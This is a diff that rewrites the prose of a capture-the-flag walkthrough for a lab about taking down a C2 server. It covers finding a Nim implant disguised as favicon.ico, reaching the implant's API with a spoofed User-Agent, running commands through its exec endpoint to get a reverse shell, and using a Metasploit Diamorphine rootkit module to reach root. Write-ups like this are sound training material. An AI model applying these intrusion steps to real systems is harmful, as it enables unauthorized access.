@@ -61,29 +61,29 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-After reading the document in our task files I found something interesting in the `indicators of compromise` I downloaded the `favicon.ico` from the website used strings on it and parsed the output and found some interesting things bellow
+Working through the task files, something under the indicators of compromise section caught my attention. I pulled the site's `favicon.ico` down directly, ran `strings` against it, and combed through the output looking for anything that didn't belong in an ordinary icon file. A few things stood out immediately:
 
 
 ![Pasted image 20250519044207](Pasted-image-20250519044207.png)
 
 ![Pasted image 20250519044237](Pasted-image-20250519044237.png)
 
-Just found some possible end points here
+Buried in that output were what looked like real API endpoints:
 
 ```bash
 http://takedown.thm.local/api/agents/
 http://takedown.thm.local/api/agents/register
 ```
 
-From looking at the `favicon.ico` I have determined that it is a `nim` payload.
+Digging further into the `favicon.ico` binary, I confirmed it wasn't an icon at all, it was a compiled Nim payload disguised behind an image extension.
 
 ![Pasted image 20250519050805](Pasted-image-20250519050805.png)
 
-found more proof of compromise `shutterbug.jpg.bak`
+Applying the same scrutiny to the other static assets on the site turned up a second artifact, `shutterbug.jpg.bak`, further confirmation that this box had already been compromised by the scenario's threat actor before I ever touched it.
 
 ### Investigating the API
 
-looking back the the malware files I wanted to try to see what data is at these endpoints normally I can not visit them using burp but I found a way to do so I saw that it was requreing a specific user agent below.
+Going back to the malware artifacts, I wanted to see what these API endpoints actually returned under normal conditions. Hitting them directly through Burp got me nowhere at first, every request just fell through silently, but comparing that behavior against clues from the implant told me the server was gating access behind a very specific User-Agent string. Appending that suffix to an ordinary browser User-Agent got me through:
 
 ```http
 GET /api/agents HTTP/1.1
@@ -155,7 +155,7 @@ Vary: Origin
 Available Commands: ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', 'get_hostname']
 ```
 
-I was able to find a list of commands we can execute I am going to try to get a shell.
+That gave me a full list of commands the implant supports, and `exec` was exactly what I needed to pursue next to get an actual shell.
 
 ```HTTP
 POST /api/agents/qizg-ilom-cbks-uhua/exec HTTP/1.1
@@ -192,7 +192,7 @@ New commnad to execute: id
 ```
 
 
-I was able to get a shell from the following.
+Encoding a full reverse-shell one-liner in base64 and feeding it through `exec` was enough to pop a working shell back to my listener:
 
 ```http
 POST /api/agents/qizg-ilom-cbks-uhua/exec HTTP/1.1
@@ -216,7 +216,7 @@ Content-Type: application/json;charset=UTF-8
 
 ### System Enumeration
 
-interesting things I found with `linpeas`
+Running `linpeas` on the box surfaced a couple of things worth chasing, most notably a process that had no business being in a normal userland listing:
 
 ```bash
 ╔══════════╣ Checking if runc is available
@@ -237,7 +237,7 @@ webadmi+    1922  0.1  0.2   3328  2052 ?        Ss   08:30   0:11 /usr/share/di
 
 #### GETTING ROOT
 
-I decided to run exploit suggester on `metasploit` just in case because at this point in time I am a little list even checked for internal running services to forward to my machine nothing I ran the `exploit/linux/local/diamorphine_rootkit_signal_priv_esc ` module and was able to get root!
+At this point I'd run out of obvious leads, even checking for internal services I could forward to my own machine came up empty, so I decided to run Metasploit's local exploit suggester against the box just to be thorough:
 
 ```bash
  #   Name                                                               Potentially Vulnerable?  Check Result
@@ -249,6 +249,8 @@ I decided to run exploit suggester on `metasploit` just in case because at this 
  5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.8.31.pre.1ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
 
 ```
+
+Several modules came back as candidates, but `diamorphine_rootkit_signal_priv_esc` was the one that mattered to me, since I'd already spotted that suspicious `svcgh0st` process tied to Diamorphine running as a service during enumeration. I ran that module directly against the target:
 
 ```bash
 msf6 exploit(linux/local/diamorphine_rootkit_signal_priv_esc) > run
@@ -270,3 +272,5 @@ Channel 1 created.
 id
 uid=0(root) gid=0(root) groups=0(root),1001(webadmin-lowpriv)
 ```
+
+The Diamorphine signal handler did exactly what the suggester promised: the moment the exploit sent its trigger signal, my dropped stager executed with root privileges and Meterpreter handed me a fully privileged shell, closing out the "take down the C2" scenario as root on its own attacker infrastructure.
